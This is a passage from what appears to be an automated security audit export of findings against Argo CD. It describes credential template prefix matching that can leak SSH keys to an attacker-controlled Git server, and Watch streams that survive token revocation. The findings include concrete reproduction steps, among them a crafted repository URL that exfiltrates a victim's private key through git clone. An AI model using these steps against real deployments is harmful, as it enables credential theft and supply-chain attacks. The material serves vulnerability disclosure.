`argocd.argoproj.io/secret-type: repo-creds`) containing SSH private keys, HTTPS credentials, or TLS client certificates flow into a repository object whose URL resolves to an attacker-controlled Git server. The credentials cross the ArgoCD trust boundary into the attacker's infrastructure.\n\n## Impact\n\n- **Confidentiality HIGH**: SSH private keys, HTTPS passwords/PATs, and TLS client certificates for all repositories matching the credential template prefix are exfiltrated to the attacker-controlled server via `git clone`/`git fetch`.\n- **Integrity HIGH**: With stolen SSH keys or HTTPS tokens, the attacker can push to any repository that those credentials protect, enabling supply chain attacks across the entire organization.\n- **Breadth**: Credential templates typically cover entire organizations (e.g., `git@github.com:myorg`). One match exfiltrates the master credential for all repositories under that org.\n\n## Evidence\n\n1. `util/db/repository_secrets.go:594`: `credURL := git.NormalizeGitURL(string(cred.Data[\"url\"]))` — normalizes to lowercase with SSH rewritten but no trailing separator appended.\n2. `util/db/repository_secrets.go:597`: `if strings.HasPrefix(repoURL, credURL)` — bare prefix check; no enforcement that `credURL` is followed by `/`, `:`, or end-of-string in `repoURL`.\n3. Test data confirms credential templates are stored without trailing separators: `git@github.com:argoproj` normalizes to `git@github.com/argoproj` (see `util/db/repository_secrets_test.go:554`).\n4. Attack: cred template `git@github.com:argoproj` → normalized `git@github.com/argoproj`. Attacker URL `git@github.com:argoproj-attacker` → normalized `git@github.com/argoproj-attacker`. `HasPrefix(\"git@github.com/argoproj-attacker\", \"git@github.com/argoproj\")` = TRUE.\n5. `util/db/repository.go:441`: `repository.CopyCredentialsFrom(creds)` — SSH key, password, TLS cert unconditionally copied.\n\n## Reproduction Steps\n\n1. Configure ArgoCD with a Git credential template: URL = `git@github.com:victim-org`, SSH private key = `\u003cvictim-ssh-key\u003e`.\n2. As a low-privileged ArgoCD user (Application create permission), create an Application:\n   `spec.source.repoURL: git@github.com:victim-orgattacker` pointing to an attacker-controlled Git server.\n3. ArgoCD's `enrichCredsToRepo` calls `getRepositoryCredentialIndex`. After normalization, `credURL` = `git@github.com/victim-org` and `repoURL` = `git@github.com/victim-orgattacker`. `HasPrefix(repoURL, credURL)` = TRUE — credential template matched.\n4. `CopyCredentialsFrom` copies the SSH private key into the repository struct.\n5. `argocd-repo-server` executes `git clone git@github.com:victim-orgattacker` with `GIT_SSH_COMMAND` pointing to the stolen key. The attacker's server receives the SSH connection authenticated with `victim-org`'s private key, exfiltrating it.\n","severity":"high","confidence":"tentative","tags":["archon","phase-10","valid","poc-executed"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"72cc603ddfdcd92705ca7747893631d3","found_at":"2026-04-09T18:07:34.412733Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":855,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-008","module_name":"`ApplicationSetService.Watch` (`server/applicationset/applicationset.go:76`) is a gRPC server-streaming RPC with the same structural problem as `ApplicationService.Watch` (p10-007). The `grpc_auth.Str","module_type":"whitebox","finding_source":"archon","module_short":"grpc-appset-watch-stream-survives-token-revocation","description":"## Summary\n\n`ApplicationSetService.Watch` (`server/applicationset/applicationset.go:76`) is a gRPC server-streaming RPC with the same structural problem as `ApplicationService.Watch` (p10-007). The `grpc_auth.StreamServerInterceptor` calls `Authenticate` (and thus `VerifyToken`) once at stream establishment. The handler captures `claims := ws.Context().Value(\"claims\")` at line 87 and uses it inside `sendIfPermitted` for every event in the infinite event loop. If the token is revoked after stream establishment, the stream continues delivering ApplicationSet state events indefinitely.\n\n## Location\n\n- `server/server.go:958` — `grpc_auth.StreamServerInterceptor(server.Authenticate)` — one-time auth\n- `server/applicationset/applicationset.go:87` — `claims := ws.Context().Value(\"claims\")` — captured once\n- `server/applicationset/applicationset.go:98-111` — `sendIfPermitted` uses stale claims on every event\n- `server/applicationset/applicationset.go:128-135` — infinite event loop, no VerifyToken call\n\n## Attacker Control\n\n- Attacker opens an ApplicationSetService.Watch stream (requires `applicationsets, get` RBAC permission)\n- Admin revokes attacker's token\n- Attacker continues receiving live ApplicationSet state events indefinitely\n- Stream only terminates on client disconnect\n\n## Trust Boundary Crossed\n\nSession lifecycle boundary — token revocation does not propagate to active ApplicationSet Watch streams.\n\n## Impact\n\n- Revoked users retain real-time visibility into ApplicationSet objects (generators, template specs, project membership)\n- ApplicationSet events may expose Git repo URLs, templated parameter values, and SCM provider configuration embedded in generator specs\n- Same severity as p10-007 (MEDIUM): read-only access, not exec, but revocation is ineffective\n\n## Evidence\n\n```go\n// server/applicationset/applicationset.go:76-135\nfunc (s *Server) Watch(q *applicationset.ApplicationSetWatchQuery,\n    ws applicationset.ApplicationSetService_WatchServer) error {\n    // ...\n    claims := ws.Context().Value(\"claims\")  // frozen at stream-start\n\n    sendIfPermitted := func(a v1alpha1.ApplicationSet, eventType watch.EventType) {\n        permitted := s.isApplicationsetPermitted(selector, minVersion, claims, ...)  // stale claims\n        // ...\n        ws.Send(...)  // sends to potentially revoked user\n    }\n\n    unsubscribe := s.appSetBroadcaster.Subscribe(events)\n    defer unsubscribe()\n    // ... (initial list)\n    for {\n        select {\n        case event := \u003c-events:\n            sendIfPermitted(event.ApplicationSet, event.Type)  // no VerifyToken\n        case \u003c-ws.Context().Done():\n            return nil\n        }\n    }\n}\n```\n\n## Reproduction Steps\n\n1. As a user with `applicationsets, get` RBAC permission, open an ApplicationSet Watch stream\n2. Confirm events are being received\n3. As admin, revoke the user's token\n4. Observe that ApplicationSet events continue to arrive on the open stream\n5. New stream attempts are correctly rejected; existing stream is never server-side terminated\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"dafb43c28f44fe9c9a87ea5dc0ddefc7","found_at":"2026-04-09T18:07:34.412732Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":854,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-007","module_name":"The `ApplicationService.Watch` gRPC server-streaming RPC performs token validation exactly once — at stream establishment — via the `grpc_auth.StreamServerInterceptor(server.Authenticate)` interce","module_type":"whitebox","finding_source":"archon","module_short":"grpc-watch-stream-survives-token-revocation","description":"## Summary\n\nThe `ApplicationService.Watch` gRPC server-streaming RPC performs token validation exactly once — at stream establishment — via the `grpc_auth.StreamServerInterceptor(server.Authenticate)` interceptor. `Authenticate` calls `VerifyToken` and bakes the resulting `claims` into the context. The stream handler (`server/application/application.go:Watch`) then captures `claims` from the context once and uses them in ever
